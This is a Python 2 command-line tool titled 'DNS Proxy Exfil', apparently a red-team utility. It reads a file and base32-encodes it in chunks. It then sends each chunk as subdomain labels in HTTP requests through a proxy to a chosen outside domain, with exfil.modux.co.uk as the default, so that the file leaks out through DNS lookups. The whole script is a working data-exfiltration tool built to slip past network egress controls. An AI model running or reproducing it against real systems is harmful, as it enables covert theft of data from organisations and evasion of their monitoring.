import requests, base64, StringIO
import os,binascii,sys,time,re
import argparse

proxydict = {"http"  : "",}

config= {"rootdomain": "exfil.modux.co.uk", "chunksize": 0, "ran": binascii.b2a_hex(os.urandom(2))}
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}

def decoder(base64array):
    filedecode=''
   
    for i in base64array:
        filedecode+=i
    
def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def padstring(chunk, chunksize):
        if len(chunk) == 0:
            return None
        padsize=chunksize-len(chunk)

        chunk+='_'*padsize
        return chunk

def sendrequest(string, count):
    # add random string at beginning to ensure query gets relayed
    
    #split long strings into subdomains of 63 (max size)
    string='.'.join(re.findall(r'.{1,63}', string))
    
    count=str(count)
    string=string.replace('=', '-')
    try:
        r = requests.get('http://'+str(config["ran"])+'.'+count+'.'+string+'.'+config["rootdomain"], headers=headers, proxies=proxydict)
    except requests.exceptions.RequestException as e: 
        pass
    try:
        r = requests.get('http://'+str(config["ran"])+'.'+count+'.'+string+'.'+config["rootdomain"], headers=headers, proxies=proxydict)
    except requests.exceptions.RequestException as e: 
        pass
        
def sendFile(file, filename):
    fullarray=[]
    
    # send start request
    print 'send start'
    print 'DNS tunneling is slow, make a cup of tea or three...'
    count=1
    
    # add domain splitter 2e0o2e
    sendrequest('startoffile.'+filename+'.2e0o2e', count)
    
    
    time.sleep(2)
    sleepcount=0
    while True: 
        chunk = file.read(config["chunksize"]) 
     #  time.sleep(0.01)
        
        # increment sleepcount to give DNS a rest  to increase reliability of file transfer
        if sleepcount==20:
            #time.sleep(0.5)
            sleepcount=0
        else:
            sleepcount+=1
        if not chunk: break
     #     chunk
#        chunk=padstring(chunk,chunksize)
        b32file=base64.b32encode(chunk)
    
        sendrequest(b32file, count)
        count+=1
     
    # close sending request
    print 'Wrapping up...'
    time.sleep(2)

    sendrequest('endoffile', count)
    print 'File send complete.'

    count=1
        
        
        
def main(args):
        
    config["rootdomain"]=args.rootdomain
    filename=args.filename
    
    proxydict["http_proxy"]=args.http_proxy


    file = open(filename, "rb")
    filesize=os.path.getsize(filename)

    # for exfil - send request but don't wait for response
    
    
        
    #create random ID for transaction to prevent caching
    

    #max total domain length as per RFC
    maxdomain=253
    maxdomainlabel=63
    #number of random bytes in requrst ID
    randsize=4
    #max size of request limit (9999999)
    countsize=7

    # represents 57 bytes after base64 - max is 63
    subdomainsize=35
    spaceremaining=maxdomain-len(config["rootdomain"])-randsize-countsize
    #calculate maximum number of blocks we can use to send data based on subdomain provided
    numblocks=spaceremaining/maxdomainlabel
    config["chunksize"]=numblocks*subdomainsize

    print "I predict this will take " + str(filesize/config["chunksize"]+1) + " DNS requests"

    sendFile(file, filename)

def parse_arguments():
    parser = argparse.ArgumentParser(description='DNS Proxy Exfil')

    parser.add_argument('-f', '--file', dest='filename',
                        help='File to send over DNS')
    parser.add_argument('-p', '--proxy', dest='http_proxy',
                        help='HTTP Proxy to send requests through')
    parser.add_argument('-d', '--domain', dest='rootdomain',
                        help='Sub Domain to send requests for')

    args = parser.parse_args()
    return args

if __name__ == '__main__':
    arguments = parse_arguments()
    main(arguments)

